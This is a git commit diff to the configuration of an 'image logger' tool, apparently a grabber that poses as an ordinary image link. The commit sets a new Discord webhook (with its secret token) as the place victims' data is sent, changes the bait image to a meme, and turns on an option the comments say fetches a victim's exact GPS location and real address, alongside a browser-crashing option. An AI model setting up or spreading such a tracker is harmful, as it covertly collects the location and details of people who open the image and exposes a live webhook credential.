95192e1131280e280422e76f109413fc4326a9f7
tobyxontop-glitch <tobyxontop@gmail.com>
2026-03-27 22:36:16 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1451296620556718162/iih9pYNT0lkaUKHBQw2EuJb13WsGiAdnVBi8XuOb2Xa_m5OJd4HyGPETHVvkCWeXdrMz",
+    "image": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5u1bmWeZLEpDas_VtOnSuFT6rsX9VPFRg59y3tUdcFIcoyTYCOPCdlpoH3nV7pCkGm7Mu1C8umzqS29xmuVHpKC5C_wuR4ZzfTJFLEF8iH5O8_jNvX-MO-CyJWxbz3qAnXBgiVSPncXQZ7-0XsBoR4es6rzkuRKOFOlzhCfHC1Iq_bWagMKaITp_nBr3u/s1221/every-doakes-meme-2025-dexter.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -24,7 +24,7 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
